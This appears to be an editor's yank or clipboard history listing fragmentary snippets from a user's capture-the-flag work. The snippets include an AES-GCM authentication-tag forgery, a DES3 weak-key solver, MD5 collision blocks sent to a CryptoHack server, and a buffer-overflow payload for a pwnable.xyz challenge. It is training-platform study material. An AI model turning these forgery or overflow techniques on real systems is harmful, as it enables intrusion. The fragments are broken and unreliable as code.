b62aacb4e9e011ebc18f72e1a1b56c99|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|34|21|V|python
	t0 = 92847995657081002088797765460976811639
	t1 = 123718425799051876287128587136788240142
f9b6b4b2d83a26f9941d89d50fd3319a|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|38|1|V|python
	t0 = 92847995657081002088797765460976811639
54a0dd0cb1f048424ddf68c8d3464f79|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|53|5|v|python
	(c0 + c1) * y^2 + (padded_ad + padded_ad) * y + (t0 + t1)
025373c23d1b42338e04360940e3b8f2|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|55|1|V|python
	print((c0 + c1) * sol^2 + (padded_ad + padded_ad) * sol + (t0 + t1))
11b297e168ae12a2a53ca499f4159f17|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|53|38|v|python
	padded_ad
29d3d791a2527e5f46010c10583ed7a4|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|24|1|v|python
	216427973194322995277703903352201750668
7b96ab1de449cca65a467675bf33cc6d|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|28|1|V|python
	    ciphertext, auth_tag = cipher.encrypt_and_digest(plaintext)
e9d8216f494b8a1ba08fd7fd7f547d62|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|53|1|V|python
	f = (padded_ad + padded_ad) * y^2 + (c0 + c1) * y + (t0 + t1)
a02303ea6768a55ced641dbce27c0267|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|54|5|^v|python
	(padded_ad + padded_ad) * y^2 + (
ee9d91bf5f3951d4f951bd624545ed93|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|54|1|V|python
	f = (c0 + c1) * y + (t0 + t1)
3cf63519bb05acb91ef65ff37973f065|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|56|1|v|python
	sol_int
b8623b4f64408e8456f1aedfe02f2613|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|19|1|V|python
	        print('Ciphertext: ', bytes_to_long(ciphertext))
092f5fa58e4f619d739f5b65f2ed38bc|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|11|48|v|python
	testabcd
df53f99fee2afe2aabd2f7c6b751ff2a|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|31|5|V|python
	    # ciphertext, auth_tag = cipher.encrypt_and_digest(plaintext)
dd3be69e5eeb9243cf2187708f6beef5|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|59|1|V|python
	part_ct = b'\x00W*T;\xec"n\xcd\x12\x12\x13v\x86Y'
	for i in range(256):
	    ct = part_ct + bytes(i)
eb9d983ca63d70b906d981a0ff9a5f5f|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|59|1|V|python
	part_ct = b'\x00W*T;\xec"n\xcd\x12\x12\x13v\x86Y'
35e1a2f4519ac4aab5855cb5711c4ebd|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|11|49|v|python
	ive me the fla
83c1a0f17b2e4db67346866cdcc28df4|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|11|44|v|python
	, b'give me the flag'.hex()
fbd7055089bc66353483470832bfff13|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|13|1|V|python
	        encrypted = requests.get(url= URL_ENCRYPT + test_pt[i]).json()
6cc650820db0430830038bce2a871249|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|23|1|v|python
	 b'give me the flag'.hex()
dfa16198f8e98027df8fd8c2b3b69b17|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|15|1|V|python
	        ciphertext = bytes.fromhex(encrypted['ciphertext'])
c2be5d9a0fdb59da9a845dd24c498491|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|61|49|V|python
	for i in range(452588361606619249311887241026885888, 452588361606619249311887241026886143, 1):
	    f_tag = padded_ad * y^2
6b02090cc6ffce54dc28cdaab4bd25f2|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|55|1|V|python
	print(sol)
4153d722dbe81de58ddd842e64072770|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|43|1|V|python
	c1_len_bits = ''.join(str(b) for b in Integer(c1.nbits()).digits(2)).ljust(64, '0')[::-1]
2067eb6d0f808dedf3003c42ec8e778c|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|65|1|V|python
	ct_len_bits = ''.join(str(b) for b in Integer(ciphertext.nbits()).digits(2)).ljust(64, '0')[::-1]
f0729595a08e6b03484d3d2c2b5c76a6|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|55|1|v|python
	auth_key
72510f6d91a15d87bc19dbe5d16c0fc6|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|29|5|V|python
	    key = 58690955595087993864702262660757681588 # From gcm.sage
564b9df77c3bd4116d580559f8ceb9ad|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|29|5|v|python
	key = 58690955595087993864702262660757681588 
1ff7826d4cb63505b709db84cbc1f416|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|29|5|V|python
	    key = long_to_bytes(key)
b762f80a34e4f80de16923bb31369320|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|29|5|V|python
	    # cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
6aa8b3788838d89c087049a3d0c90536|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|29|5|V|python
	    # plaintext = b'give me the flag'
a84ff2db844165ba3174356ae3739ab9|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|29|5|V|python
	    # encrypted = cipher.update(associated_data)
e46fcaf50451579fc791014ed372b392|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|29|5|V|python
	    # ciphertext, auth_tag = cipher.encrypt_and_digest(b'abcd')
893002bee54bda4d688c98b2a201ef60|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|29|5|V|python
	    # print(ciphertext)
d039e90e0b44578074f495336d7cc7ec|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|29|5|V|python
	    # print(tag)
29021338b42af5d36063a7fa573313f3|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|29|5|V|python
	    # print(auth_tag)
4d8e805bc176a8679eefdbd2959ae492|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|68|1|V|python
	f_tag = padded_ad * auth_key^3 + ciphertext * auth_key + lct * auth_key + s
f47e41f857260eba3ad1d4da71b41e33|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|58|12|v|python
	+ l0 * y + c0 * y^2 + ad * y^3
3594946039fd36b4ca66cc5ea29fe344|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|58|1|V|python
	f_mac = t0 + l0 * auth_key + c0 * auth_key^2 + paddeded_ad * auth_key^3
d7aa0a54fe6a3220209145327d2361be|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|37|6|v|python
	92847995657081002088797765460976811639
7ccbf2112a7017fa91aa4ddfbdfd1b0f|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|38|6|v|python
	106708821
0330fbcb01ae83a452885f8ebdcd0ba5|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|39|6|v|python
	123718425799051876287128587136788240142
f6327d57081199f5f76007b50e834b89|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|59|1|V|python
	# s = f_mac.roots()[0][0]
6723236259b7926fd3ff69c8c60aa2d0|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|58|1|V|python
	f_mac1 = t0 + l0 * auth_key + c0 * auth_key^2 + padded_ad * auth_key^3
	s1 = ele2int(f_mac)
	print(s1)
04b248b1d287cfca7a481341ce33ece1|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|79|1|V|python
	# test_tag = padded_ad * auth_key^3 + c0 * auth_key + l0 * auth_key + s
	# print(ele2int(test_tag))
	# print(ele2int(t0))
ceedfe4be813806bc4bfbc7bfbb76f65|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|64|1|V|python
	print(s1)
9cc0ed928826abbae12dd4d4f8d8820a|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|60|1|V|python
	print(s0)
88528a1a95e7805740e5d914aceca9ae|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|69|1|V|python
	print(ele2int(t0))
a1b389b420186d17a54eae06dfb5bc33|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|70|1|V|python
	print(ele2int(t1))
67aec1f49fa6b355954f61450bb8395a|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|68|8|V|python
	print(ele2int(test_tag))
	print(ele2int(t0))
2f90767e3c6c4c1b43cf409d9dc9d7cf|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|76|1|V|python
	print(f_tag)
3a6b7b9b118e5df5adfd84bfc8b7a8b5|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|28|5|v|python
	auth_tag = b'f\xc7\xef~\x85\x0c\xeaD9N|C\xdfI\xe0\xf0' 
6a85a2fe6f36f6ffc660b06b98092e75|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|28|5|v|python
	# From gcm.sage
b7713957f1bdd041e86f10fb8b41e44e|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|10|5|V|python
	    test_pt = [(b'a'*16).hex(), (b'b'*16).hex()]
84c37b37eee31e017e599c36dc44cf59|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|10|5|V|python
	    for i in range(2):
34f9746699c67cc93c84655a056a3a07|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|11|1|V|python
	        nonce = bytes.fromhex(encrypted['nonce'])
	        ciphertext = bytes.fromhex(encrypted['ciphertext'])
	        tag = bytes.fromhex(encrypted['tag'])
	        associated_data = bytes.fromhex(encrypted['associated_data'])
	        print('Nonce: ', bytes_to_long(nonce))
	        print('Ciphertext: ', bytes_to_long(ciphertext))
	        print('Ciphertext: ', (ciphertext))
	        print('Tag: ', bytes_to_long(tag))
	        print('Associated data: ', bytes_to_long(associated_data))
	
	    encrypted = requests.get(url= URL_ENCRYPT + b'give me the flag'.hex()).json()
	    ciphertext = bytes.fromhex(encrypted['ciphertext'])
	    print(ciphertext)
	
	    auth_tag = b'\xe8\nd\x17?\x1b\xed\xc7\xdc\xbd\xe9\x99\xbe"\xbc\xe8' # From gcm.sage
	    flag = requests.get(url= URL_DECRYPT + nonce.hex() + '/' + ciphertext.hex() + '/' + auth_tag.hex() + '/' + associated_data.hex()).json()
	    print(bytes.fromhex(flag['plaintext']))
b3a20189925c00b637ddd7bf525c025c|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|6|43|v|python
	forbidden_fruit/encrypt/
31b6e4be8f52f4cf26a71cb95f140ae2|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|7|43|v|python
	forbidden_fruit/decrypt/
fb84708d32d00fca5d352e460776584c|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|7|5|v|python
	DECRYPT
47c925bb5bd2a1d7c8d05ef78fd6a023|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|11|1|V|python
	    encrypted_flag = requests.get(url= URL_ENCRYPT_FLAG + key.hex()).json()['ciphertext']
327a6c4304ad5938eaf0efb6cc3e53dc|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|12|15|v|python
	flag
6cadb4f273b3095ed14eda24d7dd4932|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|12|1|V|python
	    encrypted_flag = bytes.fromhex(encrypted_flag)
75a43e0c52a3f641ad92673945399950|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|19|2|V|python
	    print(encrypted_flag)
	    print(encrypted_text)
1e3529f01affb0ffa64376fa4f5ed3af|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|5|32|^v|python
	getPrime, inverse, 
65d28e4322925c86fca34608ad95b675|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|22|5|V|python
	    print(xor_bytes(encrypted_flag, encrypted_text))
b735e0c9515a08626beb6d9a0f915f49|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|21|5|V|python
	    # text = b'\x00' * 40
5e4ea0c05daae6829e5661042ace35ab|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|19|5|V|python
	    dec = cipher.decrypt(enc)
d0c831bb5d1882e7289ac02bf8960164|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|17|5|V|python
	    print(iv * 5)
0740853c4eb5757d72aa7ca0c6944940|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|21|1|V|python
	    print(xor_bytes(enc,iv*5))
fe1dc3c8090325b87aab86db7783d0d8|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|23|12|^v|python
	Plaintext xor iv encrypted:',
2d9e136af039527baf733154cbbd14e6|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|15|1|V|python
	    key = os.urandom(16)
f932e0c25d463545b32934235cc6dedc|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|16|11|v|python
	os.urandom(16)
48dc7ee5b75d3fef19ae0414f3beb6d6|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|31|4|V|python
	    print(plaintexts)
6cd30f0dd8911311feaa83139f1c7279|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|18|1|V|python
	    pt = xor_bytes(text, iv)
e5dc182f8459f542accbbbf5c06de678|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|29|1|V|python
	    byte_arr = [bytes([i]) for i in range(256)]
	    plaintexts = itertools.product(byte_arr, repeat=8)
	    cts = {}
	    for pt in plaintexts: 
	        pt = b''.join(pt)
	        cts[pt] = cipher.encrypt(pt)
a8db77eda7640605d835e1bd6e6f1859|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|16|5|V|python
	    # key = b'a'*8 + b'b'*8
8fbef291bb763903e10d7ce60b2fbb79|file:///home/neo/cryptohack/block-ciphers/des3/solve.py|16|27|V|python
	    # key = os.urandom(16)
	    # iv = os.urandom(8)
	    # cipher = DES3.new(key, DES3.MODE_ECB)
	    # pt = xor_bytes(text, iv)
	    # enc = cipher.encrypt(text)
	    # print('Plaintext encrypted:', enc)
	    # print('Plaintext encrypted xor iv:', xor_bytes(enc,iv))
	    # enc2 = cipher.encrypt(pt)
	    # print('Plaintext xor iv encrypted:', enc2)
	    # print('Plaintext xor iv encrypted xor iv:', xor_bytes(enc2,iv))
	    # print('Ciphertexts xor:', xor_bytes(enc, enc2))
	    # print('IV:', iv)
c7eaf1f0b010b6818b3fac70702b9dc0|file:///home/neo/cryptohack/misc/hashes/solve_collider.py|1|1|V|python
	'd131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70'
	
	'd131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70'
695336d74d9190311336033a3bf6910f|file:///home/neo/cryptohack/misc/hashes/sol_sleeve.py|1|1|V|python
	from pwn import * # pip install pwntools import json
	import json
d7c12df8a668f194d515b0a4db3c2b90|file:///home/neo/cryptohack/misc/hashes/sol_sleeve.py|74|1|V|python
	r = remote('socket.cryptohack.org', 13387)
b399bfeac58e8c85b032182fc31e6cfb|file:///home/neo/cryptohack/misc/hashes/solve_collider.py|19|1|V|python
	json_send({'document': t1.hex()})
842175c1fcea71a6870f2b0ca9929e61|file:///home/neo/cryptohack/misc/hashes/solve_collider.py|21|1|V|python
	f = json_recv()
03bf3b1914500a20c8ed7a9222c93b03|file:///home/neo/cryptohack/misc/hashes/solve_collider.py|21|1|V|python
	f = json_recv()
	print(f)
9bd82cf2f300130580b5a08140e73ec7|file:///home/neo/cryptohack/misc/hashes/solve_md0.py|14|1|V|python
	t1 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70')
	
	t2 = bytes.fromhex('d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70')
	
2a3974e2561497edb86357a25b0ed046|file:///home/neo/cryptohack/misc/hashes/solve_md0.py|14|1|v|python
	r.recvuntil('store\n')
	json_send({'document': t1.hex()})
	f = json_recv()
	print(f)
	json_send({'document': t2.hex()})
	f = json_recv()
	print(f)
8cd892b7b97ef9489ae4479d3f4ef0fc|file:///home/neo/cryptohack/misc/hashes/solve_md0.py|14|14|v|python
	store
fdc3bdefb79cec8eb8211d2499e04704|file:///home/neo/cryptohack/misc/hashes/solve_md0.py|15|13|v|python
	document
ce5ebda22275dbc88262040829f84b24|file:///home/neo/cryptohack/misc/hashes/solve_md0.py|15|22|v|python
	t1.hex()})
	f = json_recv()
	print(f)
	json_send({'document': t2.hex()})
	f = json_recv()
	print(f)
2acccd6f282e1735d764f77a2aaee882|file:///home/neo/cryptohack/misc/hashes/solve_md0.py|15|22|v|python
	t1.hex()
956d9a49f9f16a810925bbc28b5881e3|file:///home/neo/cryptohack/misc/hashes/solve_md0.py|17|1|V|python
	print(f)
cb9a0dd2b3180f1c3f772f0fc4b38934|file:///home/neo/cryptohack/misc/hashes/md0.py|1|1|V|python
	from Crypto.Cipher import AES
	from Crypto.Util.Padding import pad
f398d96b65a2fa53a7966136eeac0103|file:///home/neo/cryptohack/misc/hashes/md0.py|14|1|V|python
	def hash(data):
	    data = pad(data, 16)
	    out = b"\x00" * 16
	    for i in range(0, len(data), 16):
	        blk = data[i:i+16]
	        out = bxor(AES.new(blk, AES.MODE_ECB).encrypt(out), out)
	    return out
5e8d4c39298de8201c2ae611112a6b55|file:///home/neo/cryptohack/misc/hashes/solve_md0.py|15|2|V|python
	    data = pad(data, 16)
ba5e828cbab9de5e38a531e698f55a7e|file:///home/neo/cryptohack/misc/hashes/solve_md0.py|16|2|V|python
	    out = b"\x00" * 16
71495ef961aa6404d127dac37e8b7b14|file:///home/neo/cryptohack/misc/hashes/solve_md0.py|26|18|V|python
	json_send({'document': t2.hex()})
	f = json_recv()
e974a9d6c1d8f4425c2e1d383d6359b6|file:///home/neo/cryptohack/misc/hashes/solve_md0.py|24|1|V|python
	json_send({'option': 'sign', 'message':''})
04b29480233f4def5c875875b6bdc3b1|file:///home/neo/cryptohack/misc/hashes/solve_md0.py|29|23|v|python
	sign
7a1f85880d9e556d5c8a8027d68fec42|file:///home/neo/cryptohack/misc/hashes/md0.py|10|1|V|python
	def bxor(a, b):
	    return bytes(x ^ y for x, y in zip(a, b))
a6f122e17f074a79aa9d2d7e8fd4a33e|file:///tmp/neomutt-neo-1000-9429-16025049287468874424|5|1|v|mail
	About the whole housing thing
209e609adb2c0a74c62a94c3106b7925|file:///home/neo/cryptohack/misc/lwe/solve.py|18|1|V|python
	    json_send({'option':'get_sample'})
a8530595158a981f4d095c6645d149c7|file:///home/neo/cryptohack/misc/lwe/solve.py|23|26|v|python
	get_sample
15dca1d2e579c4e441d6a3acee7d81c7|file:///home/neo/cryptohack/misc/lwe/solve.py|25|5|V|python
	    pritn(r.recvuntil('reset'))
204c366b3b380d538d3205baf5abe525|file:///home/neo/cryptohack/misc/lwe/solve.py|18|1|V|python
	    json_send({'option':'get_sample'})
	    rec = json_recv()
	    a = rec['a']
	    b = rec['b']
	    print('a:', a)
	    print('b:', b)
6f348e2c7d6c7cada06e4d975771fe51|file:///home/neo/cryptohack/misc/lwe/solve.py|24|1|V|python
	    # json_send({'option':'get_sample'})
	    # rec = json_recv()
	    # a = rec['a']
	    # b = rec['b']
	    # print('a:', a)
	    # print('b:', b)
581cbdcd736e11427c81d25b93660135|file:///home/neo/cryptohack/misc/lwe/solve.py|27|20|V|python
	    # print('a:', a)
	    # print('b:', b)
73cfc912a662b21b436c741f09157b7d|file:///home/neo/cryptohack/misc/lwe/solve.py|24|1|V|python
	        keys[repr(a)] = {'b':[b], 'freq':1}
a3dbca1057c0ac31d0ac65c4e27abe45|file:///home/neo/cryptohack/misc/lwe/solve.py|33|16|V|python
	for key in keys:
	    print(key, keys.get(key))
942f36fb3a4e0c7a0f68372bd8e52730|file:///home/neo/cryptohack/misc/lwe/solve.py|37|8|v|python
	sorted_keys[0]
e029e33517165c0b593174748dcbdaf0|file:///home/neo/cryptohack/misc/lwe/solve.py|34|12|V|python
	values_view = a_dict.values()
	value_iterator = iter(values_view)
	first_value = next(value_iterator)
97c58d9f762d2b4e2472ccc280ed094e|file:///home/neo/cryptohack/misc/lwe/solve.py|37|1|V|python
	print(base)
ef785fc3c024e95816a3129f45a33c78|file:///home/neo/cryptohack/misc/lwe/solve.py|36|1|V|python
	# del sorted_keys[base]
784cbe70b8381c3e0e9af566ce4323d9|file:///home/neo/cryptohack/misc/lwe/solve.py|33|22|v|python
	input_dict
1fa466b01761dfb85f378a2f5a8a0016|file:///home/neo/cryptohack/misc/lwe/solve.py|41|29|V|python
	max_recurrence = max(keys, key=lambda x:keys.values().count(x))
	pritn(max_recurrence)
b0038f6cab2d16ebdcf2e36d1779d8ba|file:///home/neo/cryptohack/misc/lwe/solve.py|36|21|v|python
	freq
c934a840d5c2d7735add81ef6a0b6f21|file:///home/neo/cryptohack/misc/lwe/solve.py|36|9|V|python
	        track[value[]]=0
15ee4ae21aad744d10e6cd340d28ab38|file:///home/neo/cryptohack/misc/lwe/solve.py|36|9|V|python
	        track[value]+=1
78e3a57dcfaef35f7750a05848be46bb|file:///home/neo/cryptohack/misc/lwe/solve.py|35|1|V|python
	    if value['freq'] not in track:
1a6a84f7e6795867425d4039473f3f4e|file:///home/neo/cryptohack/misc/lwe/solve.py|34|1|V|python
	for key,value in keys.items():
518046f1fb26f1c5a363bc136735d4e9|file:///home/neo/cryptohack/misc/lwe/solve.py|35|1|V|python
	    if value['freq'] not in track:
	        track[value['freq']]=0
	    else:
	        track[value['freq']]+=1
a8ee58b4a0903cef31c510d8eaebf9c4|file:///home/neo/cryptohack/misc/lwe/solve.py|34|1|V|python
	track={}
	for key,value in keys.items():
	    track[key] = value['freq']
19d8cc88aec17400f9a3a006acd2caee|file:///home/neo/cryptohack/misc/lwe/solve.py|33|15|v|python
	a_dictionary
0204830a707139ffb09def6eacc49336|file:///home/neo/cryptohack/misc/lwe/solve.py|33|1|v|python
	max_key
49fd4c223a6a331cac8bfcfa918082d4|file:///home/neo/cryptohack/misc/lwe/solve.py|34|4|V|python
	print(track)
	base = max(track, key=track)
566fabb9836be97d0077f67d5f98f661|file:///home/neo/cryptohack/misc/lwe/solve.py|33|1|V|python
	base = max(keys, key=keys.get)
7bd14a231864e618e1840c7e117e59c1|file:///home/neo/cryptohack/misc/lwe/solve.py|33|19|v|python
	capacity
dabbe7d464a125f0975495666ecfaf29|file:///home/neo/cryptohack/misc/lwe/solve.py|33|1|V|python
	base = max(int(d['freq']) for d in keys.values())
896c15e2a45ef1f160aa0707ddc84f2e|file:///home/neo/cryptohack/misc/lwe/solve.py|33|48|v|python
	test_dict
abeb658af0eacd60e7e99bbb886eec0b|file:///home/neo/cryptohack/misc/lwe/solve.py|34|1|V|python
	{key: max(val.values()) for key, val in test_dict.items()} 
f8d231a663e045e292a7729d59b84fff|file:///home/neo/cryptohack/misc/lwe/solve.py|35|1|V|python
	# print(keys[base])
e6e719950ff2f26896fb42b7b5da18e1|file:///home/neo/cryptohack/misc/lwe/solve.py|33|29|V|python
	base = {key: max(val['freq']) for key,val in keys.items()}
	print(base)
614146de738ed165cfcaec4acd6cf0f2|file:///home/neo/cryptohack/misc/lwe/solve.py|38|7|v|python
	base_b
c028d8b2b8b50563be7122cfacc69b55|file:///home/neo/cryptohack/misc/lwe/solve.py|33|1|V|python
	sorted_keys = OrderedDict([sorted(keys.items(), key=lambda item: item[1]['freq'])])
00aa933b5cdaf6c704c91dbad11ff21f|file:///home/neo/cryptohack/misc/lwe/solve.py|34|1|V|python
	print([sorted(keys.items(), key=lambda item: item[1]['freq']))
7fafedf02a7abc54e533eddda6bbc443|file:///home/neo/cryptohack/misc/lwe/solve.py|39|1|V|python
	# print(base)
	print(sorted_keys[base])
b5fbe8773bbc5a6836b6386210650edd|file:///home/neo/cryptohack/misc/lwe/solve.py|34|1|V|python
	for k in sorted_keys:
	    print(k)
cc61cda9b4113d8da00dd84cf0aea6ec|file:///home/neo/cryptohack/misc/lwe/solve.py|39|11|V|python
	for key in sorted_keys:
	    print(key, sorted_keys.get(key))
5bea8cee20a7b69707d8a05a821d396b|file:///home/neo/cryptohack/misc/lwe/solve.py|38|1|V|python
	print(sorted_keys[base])
9d46d48486cfc015c4366c0db46cf86f|file:///home/neo/cryptohack/misc/lwe/solve.py|39|5|V|python
	    print(a_list)
529e003fb407273532642cb9b1884de3|file:///home/neo/cryptohack/misc/lwe/solve.py|37|7|v|python
	abse
e92eac4b7107fe167ed7d942753c5468|file:///home/neo/cryptohack/misc/lwe/solve.py|36|1|V|python
	base = list(base)
4aa51aa79378a17778c4915d04ba9d7c|file:///home/neo/cryptohack/misc/lwe/solve.py|39|1|V|python
	    a_list = list(a_list)
dca4f668960ebce719e3e9722f800ffd|file:///home/neo/cryptohack/misc/lwe/solve.py|43|1|V|python
	    # a_list = [n.strip() for n in a_list]
da9fef089594c3f2f43a2cab1e924596|file:///home/neo/cryptohack/misc/lwe/solve.py|38|1|V|python
	# base = [n.strip() for n in base]
337dc296e99d4ecbab31cd366bc0f255|file:///home/neo/cryptohack/misc/lwe/solve.py|36|1|V|python
	plaintext = [''] * len(base)
53a3bd327e3a07c2a818124051554f8d|file:///home/neo/.config/sxhkd/sxhkdrc|15|9|V|conf
	super + t
	    /media/neo/Storage/ctf/ghidra_9.1.2_PUBLIC/ghidraRun
912807ec501acc2b4ce77ec8219c4bd7|file:///home/neo/.zshrc|126|19|^v|zsh
	/home/neo/.local/lib/python2.7:
0414d40429edddf69664f2c49ed67604|file:///home/neo/.zshrc|126|19|v|zsh
	/home/neo/.local/lib/python2.7/site-packages:
8cdfedcf6b03d4611e519c90da87588e|file:///home/neo/pwnablexyz/note/exploit.py|37|5|V|python
	    pie breakpoint 0x9e0
cf63bed9ac42f25943f751443539c086|file:///home/neo/pwnablexyz/note/exploit.py|46|1|V|python
	io.recvuntil('> ')
	io.sendline('1')
5e7de60319474d8ea72bebde64e49819|file:///home/neo/pwnablexyz/note/exploit.py|50|1|V|python
	io.recvuntil(': ')
5f5f01d3f4cb2481d976ab8936375485|file:///home/neo/pwnablexyz/note/exploit.py|52|13|v|python
	b'A' * 40 + p64(RET)
2b8da9fe9c7417dd13d1419d3c74f048|file:///home/neo/pwnablexyz/note/exploit.py|55|1|V|python
	print(b'A' * 40 + p64(RET))
d1dbaa7419fa1909cfd266321d1042ea|file:///home/neo/pwnablexyz/note/exploit.py|4|1|V|python
	context.arch = 'amd64'
fe064109159e5771aec7fa54f06c9116|file:///home/neo/pwnablexyz/note/exploit.py|42|1|V|python
	    b edit_note
	    b edit_desc
d81add87699c65e1e4c19132bc9fcb62|file:///home/neo/.gdbinit|9|10|v|gdb
	pwndbg/gdbinit.py
2c7aea4237e25b4f8ee3b0bf77d6fed0|file:///home/neo/pwnablexyz/note/exploit.py|42|19|v|python
	verbose
0785212bbe3e601925032065aa608436|file:///home/neo/pwnablexyz/note/exploit.py|42|1|V|python
	    set exception-debug on
ab68aee644f04e5d815afbe6bbb6c957|file:///home/neo/pwnablexyz/sub/exploit.py|42|5|V|python
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
	    piebase 0x9e0
db1c636004b579141f250789113ba359|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|5|20|V|python
	    for key in keys:
	        print(key)
a53840cf92b91cadd4256a5f962c6087|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|7|11|V|python
	    for key in keys:
	        key = b''.join(key)
	        print(key)
060959e761b7f812d974b3020911dc2e|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|13|8|V|python
	        for i,c in enumerate(data):
	           pt +=  
8557def5c621772b2e29d0059b53a07d|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|9|30|v|python
	[bytes([i]) for i in range(256)]
d29d7621ff897710b8eed89ff2604c7b|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|11|9|V|python
	        key = b''.join(key)
a5165f24b10f304e53976469e4dcad8d|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|11|9|V|python
	        key = bytes(key)
89e753776ffb9130783c7e0d6ae781e3|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|13|1|V|python
	        print(len(key))
e8f16ef1c16564b6d30d010dcdd6ecf7|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|14|9|V|python
	        print(len(data))
d46d1af3a6cf0830f815f25f56c5eb25|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|13|37|v|python
	 + bytes(key[0])
9e7ec483379fe3963a11d052fc165471|file:///home/neo/CTFs/nahamcon2020/docxor/solve.py|15|9|V|python
